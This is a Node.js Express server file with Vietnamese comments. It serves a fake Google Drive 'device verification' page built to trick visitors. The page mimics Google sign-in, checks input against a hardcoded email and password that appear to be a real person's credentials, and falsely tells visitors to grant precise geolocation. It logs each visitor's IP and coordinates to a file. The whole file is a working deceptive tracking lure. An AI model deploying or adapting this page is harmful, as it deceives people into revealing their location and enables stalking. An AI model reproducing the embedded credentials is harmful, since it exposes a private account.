const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

// API lấy IP + trả về frontend
app.get("/", (req, res) => {
  const forwarded = req.headers["x-forwarded-for"];
  const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;

  console.log("IP truy cập:", ip);

  res.send(`
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Drive - Xác minh tệp tin</title>
  <style>
    body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f8f9fa; color: #3c4043; }
    .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; max-width: 400px; width: 90%; display: none; }
    .container.active { display: block; }
    .logo { width: 72px; margin-bottom: 20px; }
    h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
    p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #5f6368; }
    input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
    button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; transition: background 0.2s; width: 100%; }
    button:hover { background: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
    .error-text { color: #dc3545; font-weight: bold; }
    .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <!-- Bước 1: Login Popup -->
  <div class="container active" id="login-form">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
    <h2>Đăng nhập</h2>
    <p>Sử dụng tài khoản Google của bạn</p>
    <input type="text" id="username" placeholder="Email hoặc số điện thoại">
    <input type="password" id="password" placeholder="Nhập mật khẩu của bạn">
    <p id="login-error" class="error-text" style="display:none; font-size: 12px; margin-top: -10px; margin-bottom: 10px;">Thông tin đăng nhập không chính xác.</p>
    <button onclick="handleLogin()">Tiếp theo</button>
  </div>

  <!-- Bước 2: Verification Popup (Hiện sau khi login) -->
  <div class="container" id="app">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Google Drive">
    <h2 id="title">Xác minh thiết bị</h2>
    <p id="desc">Bạn đang truy cập từ một thiết bị mới. Vui lòng nhấn <b>Tiếp tục</b> và chọn <b>Cho phép (Allow)</b> để xác nhận danh tính và tiếp tục tải tệp tin.</p>
    <button onclick="requestLocation()">Tiếp tục</button>
  </div>

  <script>
    function handleLogin() {
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;
      const error = document.getElementById("login-error");

      // Username/Password mặc định
      if (user === "hongtuyen1989@gmail.com" && pass === "Tranthihongtuyen@1989") {
        document.getElementById("login-form").classList.remove("active");
        document.getElementById("app").classList.add("active");
      } else {
        error.style.display = "block";
      }
    }

    function requestLocation() {
      const desc = document.getElementById("desc");
      const app = document.getElementById("app");
      
      desc.innerHTML = "<div class='loading-spinner'></div> Đang xác thực thiết bị mới...";

      const options = {
        enableHighAccuracy: true,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        (position) => {
          desc.innerHTML = "<div class='loading-spinner'></div> Đang đồng bộ hóa dữ liệu...";
          fetch("/save", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              lat: position.coords.latitude,
              lng: position.coords.longitude
            })
          }).then(() => {
            app.innerHTML = \`
              <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg">
              <h2>Đang mở tệp tin...</h2>
              <p>Xác minh thành công. Vui lòng chờ trong giây lát trong khi chúng tôi chuẩn bị bản xem trước của bạn.</p>
              <div class="loading-spinner"></div>
            \`;
          });
        },
        (error) => {
          alert("Truy cập thất bại do thiết bị của bạn chưa được xác minh. Vui lòng nhấn vào biểu tượng ổ khóa 🔒 trên thanh địa chỉ và chọn Cho phép (Allow) để tiếp tục.");
          desc.innerHTML = "Bạn đang truy cập từ một thiết bị mới. Vui lòng nhấn <b>Tiếp tục</b> và chọn <b>Cho phép (Allow)</b> để xác nhận danh tính và tiếp tục tải tệp tin.";
        },
        options
      );
    }
  </script>

</body>
</html>
`);
});

// API lưu dữ liệu
app.post("/save", (req, res) => {
  const forwarded = req.headers["x-forwarded-for"];
  const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;

  const { lat, lng } = req.body;

  const logEntry = {
    time: new Date().toLocaleString("vi-VN"),
    ip, lat, lng
  };

  fs.appendFileSync("logs.json", JSON.stringify(logEntry) + "\n");
  console.log("Đã lưu dữ liệu mới:", logEntry);

  res.send("OK");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server chạy tại port " + PORT);
});